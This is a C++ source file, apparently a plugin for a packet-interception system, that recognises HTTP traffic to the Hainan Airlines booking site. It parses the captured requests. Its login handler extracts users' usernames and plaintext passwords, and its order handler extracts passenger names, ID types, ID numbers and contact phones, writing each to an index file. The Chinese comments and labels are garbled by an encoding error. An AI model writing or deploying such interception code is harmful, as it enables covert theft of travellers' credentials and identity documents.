
#include "StdAfx.h"

#include "ChinaHainan.h"

plane::ChinaHainan::ChinaHainan(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::ChinaHainan::~ChinaHainan()
{
	
}

//���Ϻ�������
//5 ���֤ 6 ����֤ 7 ����֤ 3 ʿ��֤ 2 ��Ч���� 14 ����֤��
string plane::ChinaHainan::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "5"){idTypeTrue = "���֤";}
	if (idType == "6"){idTypeTrue = "����֤";}
	if (idType == "7"){idTypeTrue = "����֤";}
	if (idType == "3"){idTypeTrue = "ʿ��֤";}
	if (idType == "2"){idTypeTrue = "��Ч����";}
	if (idType == "14"){idTypeTrue = "����֤��";}
	return idTypeTrue;
}

int plane::ChinaHainan::IsChinaHainan(HttpSession *http_session)
{
	//�û���¼
	if((http_session->m_Requestline.m_Host.Find("new.hnair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/hainanair/ibe/profile/processLogin.do")!=-1))
	{
		return kpclogin;
	}
	//���� ���� (��һҳ)
	if((http_session->m_Requestline.m_Host.Find("new.hnair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/hainanair/ibe/deeplink/ancillary.do")!=-1))
	{
		return kpcticket;
	}
	//���� ���� ��Ŀ�ĵ� (�ڶ�ҳ)
	if((http_session->m_Requestline.m_Host.Find("new.hnair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/hainanair/ibe/common/processSearch.do")!=-1))
	{
		return kpcticketmulti;
	}	
	if((http_session->m_Requestline.m_Host.Find("new.hnair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/hainanair/ibe/common/processSearchForm.do")!=-1))
	{
		return kpcticketmulti;
	}
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("new.hnair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/hainanair/ibe/checkout/processPassengerDetails.do")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::ChinaHainan::Process(const char *packet,int action)
{
	//��½
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//���� ����
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//��Ŀ�ĵ�
	if (action == kpcticketmulti)
	{
		return pcticketmulti(packet);
	}
	//�ύ����
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//�û���¼
int plane::ChinaHainan::pclogin(const char *packet)
{
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	ms_->Replace(src_data,"?","&");
	src_data = ms_->UrlDecode(src_data);
    ms_->SplitStringToMap(src_data,"&","=");
	username = ms_->GetValueFromMapByKey("credentials/loginUsername",true);
	password = ms_->GetValueFromMapByKey("credentials/loginPassword",true);
	//��¼����
	string loginMethodType = ms_->GetValueFromMapByKey("loginMethodType",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + 	username + "\r\n" + //�˺�
		"pass=" + 	password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

//���� ����
int plane::ChinaHainan::pcticket(const char *packet)
{
	string src_data = http_session_->m_Requestline.m_URI.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	ms_->Replace(src_data,"?","&");
	ms_->SplitStringToMap(src_data,'&','=');
	//��������
	adtCount = ms_->GetValueFromMapByKey("TA",true);
	//��ͯ����
	chdCount = ms_->GetValueFromMapByKey("TC",true);
	//��������
	deptDt = ms_->GetValueFromMapByKey("DD1",true);
	//��������
	deptDtRe = ms_->GetValueFromMapByKey("DD2",true);
	//������
	deptCdTxt = ms_->GetValueFromMapByKey("ORI",true);
	//Ŀ�ĵ�
	arrCdTxt = ms_->GetValueFromMapByKey("DES",true);
	
	//��������
	string flc = ms_->GetValueFromMapByKey("FLC",true);
	if (flc == "1") //����
	{
		if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" + adtCount + "\r\n" +	//��������
			"onick=" + 	chdCount + "\r\n" +		//��ͯ����
			"nick=" + 	deptCdTxt + "\r\n" +	//������
			"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
			"servername=" +deptDt + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if(flc == "2") //����
	{
		output_text_ =
			"netmark=" + adtCount + "\r\n" +	//��������
			"onick=" + 	chdCount + "\r\n" +		//��ͯ����
			"nick=" + 	deptCdTxt + "\r\n" +	//������
			"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
			"servername=" + deptDt + "\r\n" +	//��������
			"appname=" + 	deptDtRe + "\r\n" + //��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	return 1;
}

//��Ŀ�ĵ�
int plane::ChinaHainan::pcticketmulti(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->Replace(src_data,"?","&");
	ms_->SplitStringToMap(src_data,'&','=');
    //�г�����
	string flightType = ms_->GetValueFromMapByKey("Search/flightType",true);
	if (flightType == "oneway")
	{
		//��������
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		//��ͯ����
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		//��������
		deptDt = ms_->GetValueFromMapByKey("Search/DateInformation/departDate",true);
		//������
		deptCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Origin/location_input",true);
		//Ŀ�ĵ�
		arrCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Destination/location_input",true);
		if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" + adtCount + "\r\n" +	//��������
			"onick=" + 	chdCount + "\r\n" +		//��ͯ����
			"nick=" + 	deptCdTxt + "\r\n" +	//������
			"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
			"servername=" +deptDt + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (flightType == "return")
	{
		//��������
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		//��ͯ����
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		//��������
		deptDt = ms_->GetValueFromMapByKey("Search/DateInformation/departDate",true);
		//��������
		deptDtRe = ms_->GetValueFromMapByKey("Search/DateInformation/returnDate",true);
		//������
		deptCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Origin/location_input",true);
		//Ŀ�ĵ�
		arrCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Destination/location_input",true);
		if (deptDt.empty() || deptDtRe.empty() || deptCdTxt.empty() || arrCdTxt.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" + adtCount + "\r\n" +	//��������
			"onick=" + 	chdCount + "\r\n" +		//��ͯ����
			"nick=" + 	deptCdTxt + "\r\n" +	//������
			"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
			"servername=" +deptDt + "\r\n" +	//��������
			"appname=" + 	deptDtRe + "\r\n" + //��������
		"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (flightType == "multi-city")
	{
		//��������
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		//��ͯ����
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		
		//Search/DateInformation$2$/departTime
		//��ȡ���е�����
		int pos = src_data.rfind("DateInformation$") + strlen("DateInformation$");
		int tos = src_data.rfind("$/departTime");
		string passengerCount = src_data.substr(pos,tos - pos);
		int m = atoi(passengerCount.c_str());
		
		for (int i=1;i<=m;i++)
		{		
			CString tem ;
			tem.Format("%d",i);
			string n = tem.GetBuffer(0);	
			//�������� //Search/DateInformation$1$/departDate
			string date1 = "Search/DateInformation$";
			string date2 = "$/departDate";
			string date = date1 + n + date2;
			deptDt = ms_->GetValueFromMapByKey(date,true);
			
			//������ //Search/OriginDestinationInformation/Origin$1$/location_input
			string placedep1 = "Search/OriginDestinationInformation/Origin$";
			string placedep2 = "$/location_input";
			string placedep = placedep1 + n + placedep2;
			deptCdTxt = ms_->GetValueFromMapByKey(placedep,true);
			
			//������ //Search/OriginDestinationInformation/Destination$2$/location_input
			string placearr1 = "Search/OriginDestinationInformation/Destination$";
			string placearr2 = "$/location_input";
			string placearr = placearr1 + n + placearr2;
			arrCdTxt = ms_->GetValueFromMapByKey(placearr,true);
			
			if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty())
			{
				return 0;
			}
			if (deptCdTxt == "ƴ��/����" || arrCdTxt == "ƴ��/����")
			{
				return 0;
			}
			output_text_ =
				"netmark=" + adtCount + "\r\n" +	//��������
				"onick=" + 	chdCount + "\r\n" +		//��ͯ����
				"nick=" + 	deptCdTxt + "\r\n" +	//������
				"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
				"servername=" + deptDt + "\r\n" +	//��������
			"state=��ѯ\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}

//�ύ����
int plane::ChinaHainan::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string contactName,contactMobile,contackEmail;
	//��ϵ������
	contactName = ms_->GetValueFromMapByKey("Profile/Customer/PersonName/Surname",true);
	//��ϵ�˵绰
	contactMobile = ms_->GetValueFromMapByKey("Profile/Customer/Telephone$3$/@PhoneNumber",true);
	//product$1000$/passenger$ 2 $/insuranceSelected
	//��ȡ�˿͵�����
	int pos = src_data.rfind("passenger$") + strlen("passenger$");
	int tos = src_data.rfind("$/insuranceSelected");
	string passengerCount = src_data.substr(pos,tos - pos);
	int m = atoi(passengerCount.c_str());
    string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
	//��������
	string flightDate = ms_->GetValueFromMapByKey("flightDate",true);

	for (int i=1;i<=m;i++)
	{
		string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;
		
		CString tem ;
		tem.Format("%d",i);
		string n = tem.GetBuffer(0);
		string common = "product$1000$/passenger$";

		//�˿�����
		string nameTemp = "$/Customer/PersonName/Surname";
		string name = common + n + nameTemp;
		passengerName = ms_->GetValueFromMapByKey(name,true);

		//�˿�֤������
		string idCardTypeTemp = "$/Passport/DocType";
		string idCardType = common + n + idCardTypeTemp;
		passengerIDtypeTemp = ms_->GetValueFromMapByKey(idCardType,true);
		passengerIDtype = GetIdType(passengerIDtypeTemp);

		//�˿�֤����
		string idCardTemp ="$/Passport/DocID";
		string idCard = common +n +idCardTemp;
 		passengerIDcard = ms_->GetValueFromMapByKey(idCard,true); 

		output_text_ =
			"mid=" + 	contactName + "\r\n" +		//��ϵ������
			"oid=" + 	contactMobile + "\r\n" +	//��ϵ�˵绰
			"from=" + 	flightDate + "\r\n" +		//��������
			"msgtype=" + passengerName + "\r\n" +	//�˿�����
			"webname=" + passengerIDtype + "\r\n" + //�˿�֤������
			"subject=" + passengerIDcard + "\r\n" + //�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
	}
	return 1;
}
